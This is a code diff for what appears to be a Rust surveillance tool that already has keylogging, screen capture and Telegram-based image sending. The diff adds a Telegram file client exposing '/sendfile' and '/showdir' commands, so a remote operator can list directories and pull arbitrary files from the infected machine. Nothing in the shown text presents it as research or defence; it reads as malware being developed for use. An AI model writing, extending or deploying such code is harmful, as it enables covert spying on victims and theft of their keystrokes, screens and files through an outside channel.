@@ -10,6 +10,7 @@ mod telegram_client;
 mod screen_capture;
 mod screenshot_lib;
 mod key_log;
+mod telegram_file_client;
 
 use std::time::{Duration, SystemTime};
 use chrono::{Datelike, DateTime, Timelike, Utc};
@@ -17,6 +18,7 @@ use libc::time;
 use tokio::sync::{mpsc, oneshot};
 use telegram_client::TelegramClient;
 use crate::key_log::do_logging;
+use crate::telegram_file_client::TelegramFileClient;
 
 #[tokio::main]
 async fn main() {
@@ -57,7 +59,7 @@ async fn run() {
 
     let start = SystemTime::now();
 
-    // image sending
+    // image sending threads scheduler
     let (req_sender, mut req_receiver) = mpsc::channel::<oneshot::Sender<String>>(32);
     tokio::spawn(async move {
         let mut last_time = SystemTime::now().sub(Duration::from_millis(1000000));
@@ -74,6 +76,8 @@ async fn run() {
             }
         }
     });
+
+    // image sending threads
     req_sender.clone();
     for i in 0..NUMBER_OF_THREADS {
         let cur_req_sender = req_sender.clone();
@@ -94,5 +98,11 @@ async fn run() {
             }
         });
     }
+
+    //file sending
+    let file_client = TelegramFileClient::from_env("starting file client\n/sendfile [path to file]\n/showdir [path to directory]".to_string()).await;
+    file_client.start().await;
+
+    // we shouldn't reach this line
     tokio::time::sleep(Duration::from_millis(1000000000000000000)).await;
 }
